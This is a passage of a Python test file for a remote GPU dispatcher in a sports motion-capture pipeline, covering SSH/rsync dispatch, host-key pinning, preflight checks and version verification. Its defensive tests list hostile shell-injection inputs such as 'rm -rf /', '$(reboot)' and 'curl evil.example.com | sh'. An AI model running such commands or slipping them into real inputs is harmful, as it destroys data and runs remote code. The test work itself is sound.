    assert '"inner_bucket_sync": false' in script
    assert '"upstream_env": {' in script
    assert '"tier2_output_lite": true' in script
    compile(script, "remote_body_runner.py", "exec")


def test_remote_body_runner_script_threads_fetch_body_monoliths_to_body_stage_runner() -> None:
    slim_script = rbd._remote_body_runner_script(
        clip="wolverine",
        remote_run_dir="/remote/run",
        config=rbd.RemoteConfig(fetch_body_monoliths=False),
        max_frames=None,
        max_players=4,
    )
    monolith_script = rbd._remote_body_runner_script(
        clip="wolverine",
        remote_run_dir="/remote/run",
        config=rbd.RemoteConfig(fetch_body_monoliths=True),
        max_frames=None,
        max_players=4,
    )

    assert "write_body_monoliths=False" in slim_script
    assert "write_body_monoliths=True" in monolith_script
    compile(slim_script, "remote_body_runner.py", "exec")
    compile(monolith_script, "remote_body_runner.py", "exec")


def test_parse_sam3d_upstream_env_tuple_allows_only_approved_keys() -> None:
    parsed = rbd._parse_sam3d_upstream_env_tuple(
        "USE_COMPILE_BACKBONE=1,DECODER_COMPILE=1,INTERM_COMPILE=0,INTERM_SLIM=1,COMPILE_MODE=reduce-overhead,MHR_NO_CORRECTIVES=1"
    )

    assert parsed == {
        "USE_COMPILE_BACKBONE": "1",
        "DECODER_COMPILE": "1",
        "INTERM_COMPILE": "0",
        "INTERM_SLIM": "1",
        "COMPILE_MODE": "reduce-overhead",
        "MHR_NO_CORRECTIVES": "1",
    }

    with pytest.raises(argparse.ArgumentTypeError, match="unsupported SAM3D upstream env key"):
        rbd._parse_sam3d_upstream_env_tuple("USE_TRT_BACKBONE=1")


def test_dispatch_body_stage_writes_and_syncs_runner_script(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    uploaded: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and (cmd[-1] == "true" or cmd[-1].startswith(("test -e", "mkdir"))):
            return _completed(0)
        if _is_remote_output_listing(list(cmd)):
            return _completed(0, stdout="smpl_motion.json\n")
        if cmd[0] == "rsync":
            if ":" in cmd[-1]:  # upload
                uploaded.extend(_rsync_files_from_names(list(cmd)) or [Path(cmd[-2]).name])
                return _completed(0)
            if _is_rsync_download_batch(list(cmd)) and "smpl_motion.json" in _rsync_files_from_names(list(cmd)):
                _write_json(Path(cmd[-1]) / "smpl_motion.json", {"schema_version": 1, "model": "sam3dbody_world_joints", "fps": 30.0, "world_frame": "court_Z0", "players": []})
                return _completed(0)
            return _completed(1, stderr="not found")
        if cmd[0] == "ssh":
            return _completed(0, stdout='{"body_ran": true}')
        raise AssertionError(f"unexpected command: {cmd}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        config=rbd.RemoteConfig(fetch_body_monoliths=True, transport="rsync"),
        allow_dirty=True,
        run=fake_run,
    )
    assert result.status == "ran"
    assert (clip_dir / "remote_body_runner.py").is_file()
    assert "remote_body_runner.py" in uploaded


def test_dispatch_body_stage_writes_timing_and_remote_output_log(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    (clip_dir / "body_frames").mkdir()
    (clip_dir / "body_frames" / "frame_000000.jpg").write_bytes(b"frame")

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith(("test -e", "mkdir")):
            return _completed(0)
        if _is_remote_output_listing(list(cmd)):
            return _completed(0, stdout="skeleton3d.json\nbody_serialization_timing.json\nbody_stage_phase_timing.json\n")
        if cmd[0] == "rsync":
            src, dst = cmd[-2], cmd[-1]
            if ":" in dst:
                return _completed(0)
            if _is_rsync_download_batch(list(cmd)):
                names = _rsync_files_from_names(list(cmd))
                if "skeleton3d.json" in names:
                    _write_json(Path(dst) / "skeleton3d.json", _sam3d_skeleton_payload())
                if "body_serialization_timing.json" in names:
                    _write_json(Path(dst) / "body_serialization_timing.json", {"artifact_type": "racketsport_body_serialization_timing"})
                if "body_stage_phase_timing.json" in names:
                    _write_json(Path(dst) / "body_stage_phase_timing.json", {"artifact_type": "racketsport_body_stage_phase_timing"})
                return _completed(0)
            return _completed(1, stderr="not found")
        if cmd[0] == "ssh":
            stdout = "\n".join(
                [
                    json.dumps({"event": "script_start", "epoch_s": 1001.25}),
                    json.dumps({"event": "imports_done", "epoch_s": 1002.0}),
                    json.dumps({"event": "exit", "epoch_s": 1003.0, "exit_code": 0}),
                ]
            )
            return _completed(0, stdout=stdout, stderr="remote warning")
        raise AssertionError(f"unexpected command: {cmd}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        config=rbd.RemoteConfig(transport="rsync"),
        allow_dirty=True,
        run=fake_run,
    )

    timing = json.loads((clip_dir / "remote_body_dispatch_timing.json").read_text(encoding="utf-8"))
    assert result.timing["phases"].keys() >= {"preflight_s", "mkdir_s", "upload_s", "remote_command_s", "download_s"}
    assert timing["upload_bytes"] >= len(b"not a real video") + len(b"frame")
    assert timing["download_bytes"] > 0
    assert timing["lock_wait_estimate_s"] is not None
    log_text = (clip_dir / "remote_body_stdout.log").read_text(encoding="utf-8")
    assert '"event": "script_start"' in log_text
    assert "remote warning" in log_text


# --- Finding 7: SSH host-key verification is pinned, not disabled --------


def test_ssh_base_enables_strict_host_key_checking_with_pinned_known_hosts() -> None:
    config = rbd.RemoteConfig()
    command = config.ssh_base()

    assert "StrictHostKeyChecking=yes" in command
    assert "StrictHostKeyChecking=no" not in command
    assert any(part.startswith("UserKnownHostsFile=") for part in command)
    known_hosts_arg = next(part for part in command if part.startswith("UserKnownHostsFile="))
    known_hosts_path = Path(known_hosts_arg.split("=", 1)[1])
    assert known_hosts_path.name == "a100_known_hosts"
    assert known_hosts_path.is_file()
    host_ip = rbd.DEFAULT_REMOTE_HOST.split("@", 1)[-1]
    assert host_ip in known_hosts_path.read_text(encoding="utf-8")


def test_default_known_hosts_file_is_a_valid_pinned_entry_for_the_default_host() -> None:
    # Sanity check the pinned file itself (not just that ssh_base references
    # it): it must actually contain a known_hosts-format line for the
    # default remote host's IP, with a real-looking base64 key blob, so a
    # copy/paste or content mistake here would fail this test rather than
    # silently degrade host-key checking once it's wired into ssh_base().
    assert rbd.DEFAULT_REMOTE_HOST == "arnavchokshi@35.240.183.195"

    known_hosts_path = Path(rbd.DEFAULT_KNOWN_HOSTS_FILE)
    text = known_hosts_path.read_text(encoding="utf-8")
    host = rbd.DEFAULT_REMOTE_HOST.split("@", 1)[-1]
    prior_host = "34.143.175.207"
    data_lines = [line for line in text.splitlines() if line.strip() and not line.startswith("#")]
    assert data_lines, "known_hosts file has no key entries"
    keys_by_host: dict[str, list[tuple[str, str]]] = {}
    for line in data_lines:
        fields = line.split()
        assert len(fields) == 3, line
        addr, key_type, blob = fields
        assert key_type in {"ssh-rsa", "ssh-ed25519", "ecdsa-sha2-nistp256"}
        assert len(blob) > 60
        keys_by_host.setdefault(addr, []).append((key_type, blob))

    assert host in keys_by_host
    assert prior_host in keys_by_host
    assert keys_by_host[host] == keys_by_host[prior_host]


def test_private_ssh_material_under_configs_ssh_is_ignored_but_pinned_known_hosts_is_trackable() -> None:
    private_key_check = subprocess.run(
        ["git", "check-ignore", "-q", "configs/ssh/a100_id_ed25519"],
        check=False,
    )
    known_hosts_check = subprocess.run(
        ["git", "check-ignore", "-q", "configs/ssh/a100_known_hosts"],
        check=False,
    )

    assert private_key_check.returncode == 0
    assert known_hosts_check.returncode == 1


def test_rsync_ssh_command_also_uses_strict_host_key_checking() -> None:
    config = rbd.RemoteConfig()
    rsync_ssh = config.rsync_ssh_command()

    assert "StrictHostKeyChecking=yes" in rsync_ssh
    assert "StrictHostKeyChecking=no" not in rsync_ssh
    assert "UserKnownHostsFile=" in rsync_ssh


def test_rsync_up_and_down_do_not_disable_host_key_checking(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    seen_rsync_ssh_args: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            e_index = cmd.index("-e")
            seen_rsync_ssh_args.append(cmd[e_index + 1])
            return _completed(0)
        raise AssertionError(f"unexpected non-rsync command: {cmd}")

    rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)
    assert seen_rsync_ssh_args
    for rsync_ssh in seen_rsync_ssh_args:
        assert "StrictHostKeyChecking=no" not in rsync_ssh
        assert "StrictHostKeyChecking=yes" in rsync_ssh


# --- Finding 8: clip ids are validated and shell tokens are quoted -------


def test_validate_clip_id_accepts_safe_ids() -> None:
    assert rbd._validate_clip_id("wolverine_mixed_0200_mid_steep_corner") == "wolverine_mixed_0200_mid_steep_corner"
    assert rbd._validate_clip_id("clip-1.2") == "clip-1.2"


@pytest.mark.parametrize(
    "hostile_clip",
    [
        "wolverine; rm -rf /",
        "$(reboot)",
        "clip`whoami`",
        "clip && curl evil.example.com | sh",
        "clip with spaces",
        "../../etc/passwd",
        "",
        "clip\nrm -rf /",
    ],
)
def test_dispatch_body_stage_rejects_hostile_clip_ids_before_any_ssh_call(tmp_path: Path, hostile_clip: str) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    with pytest.raises(rbd.RemoteBodyDispatchError, match="unsafe clip id"):
        rbd.dispatch_body_stage(
            clip=hostile_clip,
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            run=fake_run,
        )

    # The whole point of validating up front is that dispatch never even
    # attempts a network round-trip (SSH/rsync) for a rejected clip id.
    assert calls == []


def test_remote_body_command_quotes_hostile_run_dir_as_a_single_argument() -> None:
    # The clip id feeds remote_run_dir (and is separately validated by
    # _validate_clip_id before dispatch), but _remote_body_command can be
    # called directly -- a hostile path must stay one shell token, never
    # terminate the string early or inject a new command via `;`/`#`.
    config = rbd.RemoteConfig()
    hostile_run_dir = "/remote/run'; rm -rf / #"

    command = rbd._remote_body_command(remote_run_dir=hostile_run_dir, config=config)

    tokens = shlex.split(command)
    # the runner-script path (hostile run dir + filename) parses back as
    # exactly one token -- proof that shlex.quote's escaping was applied.
    assert f"{hostile_run_dir}/remote_body_runner.py" in tokens
    # No stray `rm` command should appear as its own token anywhere.
    assert "rm" not in tokens


def test_remote_body_runner_script_embeds_hostile_clip_as_inert_string_literal() -> None:
    # dispatch_body_stage always validates clip ids first, but the generator
    # can be called directly: repr() embedding must keep a hostile clip id an
    # inert python string literal (the script still compiles, and the value
    # round-trips exactly).
    hostile_clip = "clip'; rm -rf / #\nimport os"
    script = rbd._remote_body_runner_script(
        clip=hostile_clip, remote_run_dir="/remote/run", config=rbd.RemoteConfig(), max_frames=None, max_players=4
    )
    compile(script, "remote_body_runner.py", "exec")
    assert repr(hostile_clip) in script


def test_mkdir_command_quotes_remote_run_dir_for_hostile_clip(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    captured_mkdir_cmd: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and "mkdir" in cmd[-1]:
            captured_mkdir_cmd.append(cmd[-1])
            return _completed(0)
        if cmd[0] == "rsync":
            return _completed(0)
        if cmd[0] == "ssh":
            return _completed(0, stdout="ok")
        raise AssertionError(f"unexpected command: {cmd}")

    # A clip id with a shell metacharacter that still matches the safe
    # pattern is not possible (the regex forbids it), so this exercises the
    # quoting on the *directory path* itself, which also contains
    # config.repo/config.run_root -- shlex.quote must still produce a
    # command `mkdir -p` accepts as a single argument.
    try:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )
    except rbd.RemoteBodyDispatchError:
        pass

    assert captured_mkdir_cmd
    mkdir_cmd = captured_mkdir_cmd[0]
    tokens = shlex.split(mkdir_cmd)
    assert tokens[0] == "mkdir"
    assert tokens[1] == "-p"
    assert len(tokens) == 3  # the whole remote path parses back as one argument
    assert tokens[2].endswith("/body_frames")


# --- Finding 7 (review_diff_20260702.md): canonical remote root + VM-layout
# preflight, failing fast with the exact missing path -----------------------


def test_default_remote_paths_share_one_canonical_root() -> None:
    # DEFAULT_REMOTE_REPO, DEFAULT_REMOTE_PYTHON, and the Fast-SAM defaults
    # each used to hardcode their own copy of "/home/arnavchokshi"; now they
    # all derive from DEFAULT_REMOTE_HOME so a VM/user change is one edit.
    home = rbd.DEFAULT_REMOTE_HOME
    # Fleet1 layout (2026-07-06): the cold-start root under the remote user's home.
    # See runs/manager/gpu_fleet.md; update this pin deliberately on fleet changes.
    assert home == "/home/arnavchokshi/coldstart_20260706"
    assert rbd.DEFAULT_REMOTE_REPO.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_PYTHON.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_FAST_SAM_PYTHON.startswith(home + "/")
    assert rbd.DEFAULT_REMOTE_FAST_SAM_ROOT.startswith(home + "/")
    # Fleet1's cold start builds ONE body venv serving both the orchestrator CLI
    # and the Fast-SAM subprocess (P0-1 lane: 27/27 GPU tests through it), so the
    # old two-venv split no longer holds by default. RemoteConfig still supports
    # separate --remote-python/--remote-fast-sam-python overrides per dispatch.
    assert rbd.DEFAULT_REMOTE_PYTHON == rbd.DEFAULT_REMOTE_FAST_SAM_PYTHON


def test_remote_layout_checks_cover_repo_python_lock_script_and_fast_sam_paths() -> None:
    config = rbd.RemoteConfig()
    checks = rbd._remote_layout_checks(config)
    labels = [label for label, _ in checks]
    paths = dict(checks)

    assert labels[0] == "remote repo"  # checked first: everything else is relative to it
    assert paths["remote repo"] == config.repo
    assert paths["remote python interpreter"] == config.python
    assert paths["gpu lock script"] == f"{config.repo}/{config.gpu_lock_script}"
    assert paths["Fast-SAM-3D-Body python interpreter"] == config.fast_sam_python
    assert paths["Fast-SAM-3D-Body root"] == config.fast_sam_root
    assert all("RTMW3D" not in label for label in labels)


def test_check_remote_layout_passes_when_all_paths_exist() -> None:
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _completed(0)

    rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)  # must not raise

    assert len(calls) == 1
    assert calls[0][0] == "ssh"
    assert calls[0][-1].startswith("test -e")


def test_check_remote_layout_raises_with_exact_missing_path() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(
            7,
            stdout="MISSING:Fast-SAM-3D-Body root:/home/arnavchokshi/body_runtime/Fast-SAM-3D-Body\n",
        )

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)

    message = str(exc_info.value)
    assert "Fast-SAM-3D-Body root" in message
    assert "/home/arnavchokshi/body_runtime/Fast-SAM-3D-Body" in message


def test_check_remote_layout_raises_generic_message_without_missing_marker() -> None:
    def fake_run(cmd, timeout_s):  # noqa: ANN001
        return _completed(255, stderr="ssh_exchange_identification: read: Connection reset by peer")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="Connection reset"):
        rbd.check_remote_layout(rbd.RemoteConfig(), run=fake_run)


def test_remote_layout_preflight_command_stops_at_first_missing_path() -> None:
    # The command chains checks with `&&`, and each check's `|| { ...; exit 7; }`
    # exits the whole remote shell (not a subshell) on the first miss, so
    # later checks in the chain never execute once one has failed.
    config = rbd.RemoteConfig()
    command = rbd._remote_layout_preflight_command(config)
    checks = rbd._remote_layout_checks(config)

    assert command.startswith("test -e")
    assert command.count("&&") == len(checks) - 1
    assert "exit 7" in command
    for label, path in checks:
        assert f"MISSING:{label}:{path}" in command


def test_dispatch_body_stage_runs_preflight_before_mkdir_and_rsync(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    steps: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            steps.append("reachable")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            steps.append("preflight")
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            steps.append("mkdir")
            return _completed(0)
        if cmd[0] == "rsync":
            steps.append("rsync")
            return _completed(0)
        if cmd[0] == "ssh":
            steps.append("remote_command")
            return _completed(0, stdout="body stage ok")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="produced no"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )

    assert steps[0] == "reachable"
    assert steps[1] == "preflight"
    assert steps.index("preflight") < steps.index("mkdir")
    assert steps.index("mkdir") < steps.index("rsync")


def test_dispatch_body_stage_fails_fast_on_preflight_before_any_mkdir_or_rsync(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("test -e"):
            return _completed(
                7,
                stdout=(
                    "MISSING:remote python interpreter:"
                    "/home/arnavchokshi/pickleball_git/.venv/bin/python\n"
                ),
            )
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="remote python interpreter"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            allow_dirty=True,
            run=fake_run,
        )

    # Only the reachability probe and the preflight check ran -- no mkdir,
    # no rsync -- proving the VM-layout check happens before any of that.
    assert [call[0] for call in calls] == ["ssh", "ssh"]
    assert calls[1][-1].startswith("test -e")


# --- Wave-3: code-sync version stamp must fail closed on remote drift -----


def test_dispatch_body_stage_fails_remote_version_verification_for_stale_runtime_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    local_repo, remote_repo = _version_fixture_repos(tmp_path, stale_remote=True)
    _patch_version_fixture_runtime(monkeypatch, local_repo)
    clip_dir = _clip_dir_with_tracks(tmp_path)
    local_sha = _git(local_repo, "rev-parse", "HEAD")
    remote_sha = _git(remote_repo, "rev-parse", "HEAD")

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=_version_fixture_config(remote_repo),
            run=_run_local_ssh_and_scp,
        )

    message = str(exc_info.value)
    assert "remote BODY version verification failed" in message
    assert "scripts/racketsport/remote_body_dispatch.py" in message
    assert local_sha in message
    assert remote_sha in message


def test_dispatch_body_stage_echoes_verified_version_stamp_for_matching_remote(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    local_repo, remote_repo = _version_fixture_repos(tmp_path, stale_remote=False)
    _patch_version_fixture_runtime(monkeypatch, local_repo)
    clip_dir = _clip_dir_with_tracks(tmp_path)

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        config=_version_fixture_config(remote_repo),
        run=_run_local_ssh_and_scp,
    )

    stamp = json.loads((clip_dir / "version_stamp.json").read_text(encoding="utf-8"))
    verification = json.loads((clip_dir / "remote_version_verification.json").read_text(encoding="utf-8"))
    dispatch_config = json.loads((clip_dir / "remote_sam3d_tier2_dispatch_config.json").read_text(encoding="utf-8"))
    assert result.status == "ran"
    assert "version_stamp.json" in result.synced_outputs
    assert stamp["remote_verification"]["verified"] is True
    assert stamp["remote_verification"]["remote_git_head_sha"] == stamp["git_head_sha"]
    assert verification["verified"] is True
    assert verification["checked_file_count"] == 1
    assert dispatch_config["version_stamp"]["verified"] is True
    assert dispatch_config["version_stamp"]["git_head_sha"] == stamp["git_head_sha"]
    assert "verified_at_utc" in dispatch_config["version_stamp"]


def test_dispatch_body_stage_refuses_dirty_tracked_runtime_file_without_allow_dirty(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    local_repo, remote_repo = _version_fixture_repos(tmp_path, stale_remote=False)
    _patch_version_fixture_runtime(monkeypatch, local_repo)
    dirty_file = local_repo / "scripts" / "racketsport" / "remote_body_dispatch.py"
    dirty_file.write_text(dirty_file.read_text(encoding="utf-8") + "\n# dirty runtime edit\n", encoding="utf-8")
    calls: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        calls.append(list(cmd))
        return _run_local_ssh_and_scp(list(cmd), timeout_s)

    with pytest.raises(rbd.RemoteBodyDispatchError) as exc_info:
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=_clip_dir_with_tracks(tmp_path),
            video_path=tmp_path / "clip" / "source.mp4",
            config=_version_fixture_config(remote_repo),
            run=fake_run,
        )

    assert "dirty tracked runtime file" in str(exc_info.value)
    assert "scripts/racketsport/remote_body_dispatch.py" in str(exc_info.value)
    assert calls == []

    stamp = rbd.build_version_stamp(
        repo_root=local_repo,
        remote_run_dir="/remote/run",
        generated_runner_sha256="0" * 64,
        allow_dirty=True,
    )
    assert stamp["git_dirty"] is True
    assert stamp["allow_dirty"] is True
    assert stamp["dirty_tracked_runtime_files"] == ["scripts/racketsport/remote_body_dispatch.py"]


def test_sync_remote_checkout_to_local_head_then_version_verification_passes_and_preserves_vendor_paths(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    local_repo, remote_repo = _version_fixture_repos(tmp_path, stale_remote=True)
    _patch_version_fixture_runtime(monkeypatch, local_repo)
    vendor_pin = remote_repo / "vendor_pins" / "keep.txt"
    vendor_pin.parent.mkdir(parents=True)
    vendor_pin.write_text("remote-only vendor pin\n", encoding="utf-8")
    local_sha = _git(local_repo, "rev-parse", "HEAD")

    result = rbd.sync_remote_checkout_to_local_head(
        config=_version_fixture_config(remote_repo),
        run=_run_local_ssh_and_scp,
        repo_root=local_repo,
        allow_dirty=False,
    )

    assert result.status == "synced"
    assert result.local_git_head_sha == local_sha
    assert result.remote_git_head_sha_after == local_sha
    assert result.verified is True
    assert vendor_pin.read_text(encoding="utf-8") == "remote-only vendor pin\n"
